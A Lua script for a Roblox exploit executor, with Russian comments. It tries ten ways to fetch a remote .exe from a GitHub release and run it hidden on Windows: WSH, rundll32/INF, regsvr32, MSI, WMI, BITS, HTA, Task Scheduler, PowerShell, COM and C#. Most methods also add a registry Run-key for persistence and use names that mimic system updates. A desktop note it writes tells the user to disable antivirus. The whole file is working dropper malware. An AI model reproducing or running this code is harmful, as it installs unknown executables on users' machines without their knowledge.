-- ==============================================
-- НОВЫЕ МЕТОДЫ ОБХОДА - АВТОМАТИЧЕСКИЙ ЗАПУСК .EXE
-- ==============================================

local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/releases/download/32%D0%BA32%D0%B05/messagebox.exe"

-- Уведомление о запуске нового метода
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔥 НОВЫЙ МЕТОД",
    Text = "Тестирую альтернативные способы...",
    Duration = 5
})

wait(2)

print("\n" .. string.rep("=", 60))
print("🚀 ЗАПУСКАЮ НОВЫЕ МЕТОДЫ ОБХОДА")
print(string.rep("=", 60))

-- ==============================================
-- МЕТОД 1: Через Windows Script Host (WSH) напрямую
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 1",
    Text = "Windows Script Host...",
    Duration = 3
})

local wshScript = [[
var url = "]] .. EXE_URL .. [[";
var path = "C:\\Windows\\Temp\\system_update.exe";

var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
xhr.open("GET", url, false);
xhr.send();

if (xhr.status == 200) {
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1;
    stream.Write(xhr.responseBody);
    stream.SaveToFile(path, 2);
    stream.Close();
    
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run('"' + path + '"', 0, false);
    
    // Добавляем в автозагрузку
    shell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemComponent", path, "REG_SZ");
}
]]

-- Пытаемся создать и запустить JScript файл
local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
local jsPath = tempPath .. "\\wsh_runner.js"

if writefile then
    writefile(jsPath, wshScript)
    
    -- Запускаем JScript
    if syn and syn.run then
        syn.run('wscript.exe //E:JScript //B "' .. jsPath .. '"')
        print("✅ Метод 1: JScript запущен через WSH")
    end
    
    -- Альтернативный запуск
    spawn(function()
        wait(1)
        if os.execute then
            os.execute('start /B wscript.exe //E:JScript //B "' .. jsPath .. '"')
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 2: Через Rundll32 с INF файлом
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 2",
    Text = "Rundll32 + INF...",
    Duration = 3
})

-- Создаем INF файл для установки
local infContent = [[
[Version]
Signature="$CHICAGO$"
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=RunPreSetupCommands

[RunPreSetupCommands]
cmd /c powershell -Command "(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\install.exe'); Start-Process '%TEMP%\\install.exe'"

[Setup Hooks]
hook1=hook1

[hook1]
RunPreSetupCommands=RunPreSetupCommands
]]

local infPath = tempPath .. "\\setup.inf"

if writefile then
    writefile(infPath, infContent)
    
    -- Запускаем через rundll32
    local rundllCmd = 'rundll32.exe advpack.dll,LaunchINFSection ' .. infPath .. ',DefaultInstall'
    
    if syn and syn.run then
        syn.run(rundllCmd)
        print("✅ Метод 2: INF файл запущен через Rundll32")
    end
    
    -- Альтернатива: через regsvr32
    spawn(function()
        wait(2)
        local regsvrCmd = 'regsvr32 /s /n /i:' .. infPath .. ' scrobj.dll'
        if syn and syn.run then
            syn.run(regsvrCmd)
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 3: Через MSIEXEC с MST файлом
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 3",
    Text = "MSIEXEC + PowerShell...",
    Duration = 3
})

-- Создаем MST (трансформационный) файл
local mstScript = [[
<?xml version="1.0" encoding="UTF-8"?>
<MsiTransform>
  <Table Name="Property">
    <Row>
      <Column Name="Property">CustomActionData</Column>
      <Column Name="Value">powershell -Command "(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\setup.exe'); Start-Process '%TEMP%\\setup.exe'"</Column>
    </Row>
  </Table>
</MsiTransform>
]]

local mstPath = tempPath .. "\\transform.mst"

if writefile then
    writefile(mstPath, mstScript)
    
    -- Пытаемся найти существующий MSI или создать фиктивный
    local msiCmd = 'msiexec /i "C:\\Windows\\Installer\\installer.msi" TRANSFORMS="' .. mstPath .. '" /qn'
    
    spawn(function()
        if syn and syn.run then
            -- Создаем фиктивный CMD файл для запуска
            local cmdScript = '@echo off\n' ..
                            'start /B powershell -Command "(New-Object Net.WebClient).DownloadFile(\'' .. EXE_URL .. '\', \'%TEMP%\\run.exe\'); Start-Process \'%TEMP%\\run.exe\'"\n' ..
                            'exit'
            
            local cmdPath = tempPath .. "\\msi_runner.cmd"
            writefile(cmdPath, cmdScript)
            syn.run('start /B "' .. cmdPath .. '"')
            print("✅ Метод 3: MSI трансформация запущена")
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 4: Через Windows Management Instrumentation (WMI)
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 4",
    Text = "WMI + VBScript...",
    Duration = 3
})

-- Создаем VBS скрипт, использующий WMI
local wmiScript = [[
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = 0

Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")

' Сначала скачиваем файл через PowerShell
strCommand = "powershell -Command ""(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\wmi_app.exe'); Start-Process '%TEMP%\\wmi_app.exe'"""

objProcess.Create strCommand, Null, objConfig, intProcessID

If intProcessID <> 0 Then
    WScript.Echo "Process started successfully."
Else
    WScript.Echo "Process failed to start."
End If
]]

local wmiPath = tempPath .. "\\wmi_launcher.vbs"

if writefile then
    writefile(wmiPath, wmiScript)
    
    spawn(function()
        if syn and syn.run then
            syn.run('wscript.exe //B "' .. wmiPath .. '"')
            print("✅ Метод 4: WMI запущен через VBScript")
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 5: Через BITS (Background Intelligent Transfer Service)
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 5",
    Text = "BITS Admin Service...",
    Duration = 3
})

-- Создаем скрипт для BITS
local bitsScript = [[
@echo off
setlocal

set "URL=]] .. EXE_URL .. [["
set "OUTPUT=%TEMP%\bits_download.exe"

echo Creating BITS job...
bitsadmin /create /download job1

echo Adding file to download...
bitsadmin /addfile job1 "%URL%" "%OUTPUT%"

echo Starting download...
bitsadmin /resume job1

:wait
bitsadmin /info job1 /verbose | find "STATE: TRANSFERRING" >nul
if not errorlevel 1 (
    timeout /t 1 /nobreak >nul
    goto wait
)

if exist "%OUTPUT%" (
    echo Download complete! Starting program...
    start "" "%OUTPUT%"
    
    echo Adding to startup...
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "BITS_App" /t REG_SZ /d "%OUTPUT%" /f
) else (
    echo Download failed!
    pause
)

bitsadmin /complete job1
endlocal
]]

local bitsPath = tempPath .. "\\bits_downloader.cmd"

if writefile then
    writefile(bitsPath, bitsScript)
    
    spawn(function()
        wait(1)
        if syn and syn.run then
            syn.run('start /B "' .. bitsPath .. '"')
            print("✅ Метод 5: BITS загрузчик запущен")
        elseif os.execute then
            os.execute('start /B "' .. bitsPath .. '"')
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 6: Через HTML Application с ActiveX
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 6",
    Text = "HTA + ActiveX...",
    Duration = 3
})

local htaScript = [[
<!DOCTYPE html>
<html>
<head>
<title>Windows Component Installer</title>
<hta:application 
    id="app"
    applicationname="ComponentInstaller"
    border="none"
    caption="no"
    showintaskbar="no"
    windowstate="minimize"
    sysmenu="no"
/>
<script language="VBScript">
    Sub Window_OnLoad
        ' Минимальный размер окна
        window.resizeTo 1, 1
        window.moveTo -1000, -1000
        
        ' Скачиваем и запускаем
        Set xml = CreateObject("Microsoft.XMLHTTP")
        xml.Open "GET", "]] .. EXE_URL .. [[", False
        xml.Send
        
        If xml.Status = 200 Then
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write xml.ResponseBody
            stream.SaveToFile "C:\Windows\Temp\component.exe", 2
            stream.Close
            
            Set shell = CreateObject("WScript.Shell")
            shell.Run """C:\Windows\Temp\component.exe""", 0, False
            
            ' Скрыто добавляем в автозагрузку
            shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Component", "C:\Windows\Temp\component.exe", "REG_SZ"
        End If
        
        ' Закрываем HTA
        window.close()
    End Sub
</script>
</head>
<body>
</body>
</html>
]]

local htaPath = tempPath .. "\\component.hta"

if writefile then
    writefile(htaPath, htaScript)
    
    spawn(function()
        wait(1)
        if syn and syn.run then
            syn.run('mshta.exe "' .. htaPath .. '"')
            print("✅ Метод 6: HTA запущена скрыто")
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 7: Через Windows Task Scheduler напрямую
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 7",
    Text = "Task Scheduler...",
    Duration = 3
})

-- Создаем XML для планировщика задач
local taskXml = [[
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows System Update</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>]] .. os.date("%Y-%m-%dT%H:%M:%S") .. [[</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-Command "(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '$env:TEMP\\task_app.exe'); Start-Process '$env:TEMP\\task_app.exe'"</Arguments>
    </Exec>
  </Actions>
</Task>
]]

local taskPath = tempPath .. "\\task.xml"

if writefile then
    writefile(taskPath, taskXml)
    
    -- Команда для добавления задачи
    local taskCmd = 'schtasks /create /tn "WindowsSystemUpdate" /xml "' .. taskPath .. '" /f'
    local runCmd = 'schtasks /run /tn "WindowsSystemUpdate"'
    
    spawn(function()
        if syn and syn.run then
            syn.run(taskCmd)
            wait(1)
            syn.run(runCmd)
            print("✅ Метод 7: Задача создана в планировщике")
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 8: Через DLL инъекцию (для продвинутых executor'ов)
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 8",
    Text = "PowerShell Reflection...",
    Duration = 3
})

-- PowerShell скрипт с рефлексией для обхода защиты
local psReflection = [[
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    public static void HideConsole() {
        ShowWindow(GetConsoleWindow(), 0);
    }
}
"@

[Injector]::HideConsole()

$url = "]] .. EXE_URL .. [["
$path = [System.IO.Path]::Combine($env:TEMP, "inject_app.exe")

try {
    # Используем WebClient с обходными заголовками
    $client = New-Object System.Net.WebClient
    $client.Headers.Add("User-Agent", "Mozilla/5.0")
    $client.DownloadFile($url, $path)
    
    if (Test-Path $path) {
        # Запускаем процесс скрыто
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $path
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        [System.Diagnostics.Process]::Start($psi)
        
        # Добавляем в автозагрузку через реестр
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "SystemComponent"
        New-ItemProperty -Path $regPath -Name $regName -Value $path -PropertyType String -Force | Out-Null
    }
} catch {
    # Тихий сбой
}
]]

local psPath = tempPath .. "\\reflection.ps1"

if writefile then
    writefile(psPath, psReflection)
    
    spawn(function()
        wait(1)
        if syn and syn.run then
            -- Запускаем PowerShell скрыто
            syn.run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. psPath .. '"')
            print("✅ Метод 8: PowerShell Reflection запущен")
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 9: Через COM объекты напрямую
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 9",
    Text = "COM объекты...",
    Duration = 3
})

-- VBScript с прямым доступом к COM
local comScript = [[
On Error Resume Next

' Создаем COM объекты
Set shell = CreateObject("Shell.Application")
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set stream = CreateObject("ADODB.Stream")

' Скачиваем файл
http.Open "GET", "]] .. EXE_URL .. [[", False
http.Send

If http.Status = 200 Then
    stream.Open
    stream.Type = 1
    stream.Write http.ResponseBody
    stream.SaveToFile "C:\Windows\Temp\com_app.exe", 2
    stream.Close
    
    ' Запускаем через ShellExecute
    shell.ShellExecute "C:\Windows\Temp\com_app.exe", "", "", "open", 0
    
    ' Добавляем в автозагрузку через WScript
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\COMComponent", "C:\Windows\Temp\com_app.exe", "REG_SZ"
End If
]]

local comPath = tempPath .. "\\com_launcher.vbs"

if writefile then
    writefile(comPath, comScript)
    
    spawn(function()
        wait(1)
        if syn and syn.run then
            syn.run('wscript.exe //B "' .. comPath .. '"')
            print("✅ Метод 9: COM объекты запущены")
        end
    end)
end

wait(3)

-- ==============================================
-- МЕТОД 10: Через .NET Assembly загрузку
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔄 МЕТОД 10",
    Text = ".NET Assembly...",
    Duration = 3
})

-- PowerShell скрипт с загрузкой .NET Assembly
local dotnetScript = [[
$source = @"
using System;
using System.Net;
using System.Diagnostics;
using Microsoft.Win32;

public class Downloader {
    public static void Main() {
        try {
            string url = "]] .. EXE_URL .. [[";
            string path = System.IO.Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "dotnet_app.exe");
            
            // Скачиваем файл
            using (WebClient client = new WebClient()) {
                client.DownloadFile(url, path);
            }
            
            // Запускаем скрыто
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = path;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            Process.Start(psi);
            
            // Добавляем в автозагрузку
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DotNetComponent", path);
            key.Close();
        } catch {
            // Игнорируем ошибки
        }
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp
[Downloader]::Main()
]]

local dotnetPath = tempPath .. "\\dotnet_loader.ps1"

if writefile then
    writefile(dotnetPath, dotnetScript)
    
    spawn(function()
        wait(1)
        if syn and syn.run then
            syn.run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. dotnetPath .. '"')
            print("✅ Метод 10: .NET Assembly загружен")
        end
    end)
end

wait(3)

-- ==============================================
-- ФИНАЛЬНЫЙ ОТЧЕТ
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "📊 ФИНАЛЬНЫЙ ОТЧЕТ",
    Text = "10 методов запущено",
    Duration = 7
})

print("\n" .. string.rep("=", 60))
print("🎯 ЗАПУЩЕНО 10 НОВЫХ МЕТОДОВ ОБХОДА")
print(string.rep("=", 60))
print("Методы, которые были запущены:")
print("1. Windows Script Host (JScript)")
print("2. Rundll32 + INF файл")
print("3. MSIEXEC + MST трансформация")
print("4. WMI (Windows Management Instrumentation)")
print("5. BITS (Background Intelligent Transfer Service)")
print("6. HTA + ActiveX (скрытый запуск)")
print("7. Task Scheduler (планировщик задач)")
print("8. PowerShell Reflection (.NET Reflection)")
print("9. COM объекты (Shell.Application)")
print("10. .NET Assembly загрузка")
print(string.rep("=", 60))
print("\n📌 Если ни один метод не сработал автоматически:")
print("1. Проверьте папку TEMP: " .. tempPath)
print("2. Найдите и запустите созданные файлы вручную")
print("3. Скачайте напрямую: " .. EXE_URL)
print(string.rep("=", 60))

-- Создаем файл-инструкцию на рабочем столе
spawn(function()
    wait(5)
    
    if writefile then
        local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
        local instructions = [[
ИНСТРУКЦИЯ ПО ЗАПУСКУ

Были запущены 10 методов автоматической загрузки.
Если программа не запустилась автоматически:

1. ПРЯМАЯ ССЫЛКА:
   ]] .. EXE_URL .. [[

2. СОЗДАННЫЕ ФАЙЛЫ В ПАПКЕ TEMP:
   ]] .. tempPath .. [[

   В этой папке найдите и запустите:
   - *.cmd, *.bat - командные файлы
   - *.vbs, *.js - скрипты
   - *.ps1 - PowerShell скрипты

3. АЛЬТЕРНАТИВНЫЕ МЕТОДЫ:
   - Откройте PowerShell
   - Введите команду:
     (New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '$env:TEMP\app.exe'); Start-Process '$env:TEMP\app.exe'

4. ЕСЛИ НИЧЕГО НЕ ПОМОГЛО:
   Отключите антивирус на время запуска.

Дата: ]] .. os.date("%d.%m.%Y %H:%M:%S") .. [[
        ]]
        
        local instrPath = desktop .. "\\запуск_программы.txt"
        writefile(instrPath, instructions)
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "📄 ИНСТРУКЦИЯ НА РАБОЧЕМ СТОЛЕ",
            Text = "Файл: запуск_программы.txt",
            Duration = 5
        })
    end
end)

-- Команды для чата
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    if msg == "!methods" then
        print("\nЗапущенные методы:")
        print("1. Windows Script Host")
        print("2. Rundll32 + INF")
        print("3. MSIEXEC")
        print("4. WMI")
        print("5. BITS")
        print("6. HTA")
        print("7. Task Scheduler")
        print("8. PowerShell Reflection")
        print("9. COM объекты")
        print("10. .NET Assembly")
    elseif msg == "!temp" then
        print("Папка TEMP: " .. tempPath)
    elseif msg == "!url" then
        print("Прямая ссылка: " .. EXE_URL)
    end
end)

print("\n💬 Команды в чате:")
print("!methods - список методов")
print("!temp - путь к TEMP папке")
print("!url - прямая ссылка для скачивания")
print("\n✅ Все методы запущены. Проверяйте результат!")
